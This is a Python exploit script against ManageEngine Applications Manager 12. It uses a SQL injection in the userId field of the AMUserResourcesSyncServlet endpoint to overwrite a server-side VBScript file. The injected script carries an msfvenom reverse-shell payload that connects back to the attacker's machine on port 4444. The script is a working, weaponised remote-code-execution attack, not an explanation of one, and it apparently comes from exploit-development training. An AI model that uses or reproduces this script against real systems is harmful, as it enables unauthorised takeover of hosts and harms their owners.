import sys, re, os
import base64
import requests
from bs4 import BeautifulSoup
import urllib.parse

def generate_shell(filename, LPORT):
	print("Generating MSF Venom Payload......")
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]

	command = f"msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -f vbs > {filename}"
	# os.popen(command).read()

	with open("shell.vbs", "r") as f:
		shellcode = f.read()
	
	# Perform find-replace operations to create 1-liner shellcode
	shellcode = re.sub(r' _.*?\n', '', shellcode)
	shellcode = re.sub(r'\t', '', shellcode)
	shellcode = re.sub(r'\n', ':', shellcode)
	while re.findall(r'::', shellcode):
		shellcode = re.sub(r'::', ':', shellcode)

	# Inject shellcode into wmiget.vbs
	with open("wmiget.vbs", "r") as f:
		script = f.read()
	script = re.sub(r'::(?=WScript.Quit\(0\))', f':{shellcode}:', script)
	while re.findall(r'::', script):
		script = re.sub(r'::', ':', script)

	with open("wmiget_shell.vbs", "w") as f:
		f.write(script)

	return script

def write_to_file(ip, content, filePath):
	print(f"Writing contents into {filePath}......")

	content_base64 = base64.b64encode(content.encode('ascii')).decode('ascii')
	content_encoded = urllib.parse.quote(content_base64)

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	userId = f"1;COPY+(SELECT+convert_from(decode($${content_encoded}$$,$$base64$$),$$utf-8$$))+TO+$${filePath}$$;--+"
	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet"
	
	# If use raw data, must specify x-www-form-urlencoded header
	data = f"ForMasRange=1&userId={userId}"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	r = s.post(target,data=data,headers=headers,verify=False)
	print(r)

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]

	shell = generate_shell(filename = "shell.vbs", LPORT = 4444)

	filepath = "C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs"
	write_to_file(ip, shell, filepath)

	print("Shellcode written, ensure netcat listener listening on port 4444")

if __name__ == '__main__':
	main()